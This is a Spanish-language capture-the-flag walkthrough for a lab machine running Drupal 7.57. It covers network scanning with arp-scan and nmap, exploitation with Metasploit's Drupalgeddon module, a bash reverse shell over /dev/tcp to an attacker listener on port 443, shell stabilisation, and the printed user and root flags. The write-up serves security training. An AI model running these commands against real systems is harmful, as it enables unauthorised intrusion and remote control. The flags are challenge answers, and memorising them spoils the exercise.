```bash
#!/bin/bash
arp-scan -I wlan0 --localnet
nmap -p- --open -sS -sC -sV --min-rate=5000 -vvv -n -Pn 10.0.2.22 -oN escaneo
msfdb init && msfconsole 



show options #Vemos las opciones del exploit
set RHOSTS http://10.0.2.7/drupal-7.57/ #Ponemos el host en la web vulnerable
run #Una vez guardado los parametros necesarios ejecutamos el exploit y llegamos a un meterpreter
shell #Creamos un shell
script /dev/null -c bash #conseguimos un promt
nc -nlvp 443 #Nos ponemos en escucha en el puerto 443 y vamos a https://www.revshells.com/ para obtener la shell
sh -i >& /dev/tcp/10.0.2.4/443 0>&1 #Ejecutamos esto en la shell victima y conseguimos conectarnos a la maquina desde nuestro ordenador
script /dev/null -c bash #Conseguimos el promt y hacemos ctrl + z
stty raw -echo;fg 
reset xterm
export SHELL=bash
export TERM=xterm
#Con estos comandos entrariamos en la maquina atacada
```
Primero de todo ejecutamos un arp-scan para ver cual es la IP de la máquina víctima, una vez obtenemos su IP ejecutamos un nmap con el que descubriremos que los puertos 22, 80 abiertos.![[Pasted image 20240309012248.png]]
Vemos que estamos en un drupal-7.57 así que entramos en el directorio drupal-7.57 y encontramos un drupal.
![[Pasted image 20240309012601.png]]
```Metasploit
search drupal 7
show options
set RHOSTS http://10.0.2.7/drupal-7.57/
run
shell
```
Abrimos metasploit y encontramos que la maquina es vulnerable contra el drupalgeddon mediante una búsqueda de exploits y usaremos ese exploit.![[Pasted image 20240309013138.png]]
Ahora configuraremos el rhosts y ejecutaremos el exploit![[Pasted image 20240309013336.png]]
Ahora ejecutaremos el comando shell y bash -i para conseguir una shell con promt![[Pasted image 20240309013517.png]]
```bash
cd /var/www/html
cat root.txt
cat user.txt
```
Ahora buscamos la flag de usuario y la de root para acabar la máquina
![[Pasted image 20240309014052.png]]
Flag de usuario: LaNu3vaInf0rm4c10n3sF4ls4
Flag de root: l4v3rd4d0sh4r4l1br3s